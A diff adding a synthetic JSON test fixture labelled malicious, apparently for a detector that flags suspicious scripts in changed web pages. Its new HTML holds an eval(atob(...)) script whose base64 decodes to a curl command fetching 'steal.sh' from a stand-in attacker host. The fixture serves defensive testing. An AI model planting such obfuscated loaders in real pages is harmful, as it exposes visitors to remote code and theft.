@@ -1,0 +1,10 @@
+{
+  "id": "H-MAL-01",
+  "label": "malicious",
+  "subset": "html_malicious",
+  "source": "synthetic: new script tag with eval() — exercises suspicious_script flag",
+  "old": "Welcome to our documentation page.",
+  "new": "Welcome to our documentation page.\nNew helper script added.",
+  "old_html": "<html><body><h1>Welcome to our documentation page.</h1></body></html>",
+  "new_html": "<html><body><h1>Welcome to our documentation page.</h1><script>eval(atob('Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vc3RlYWwuc2g='))</script></body></html>"
+}
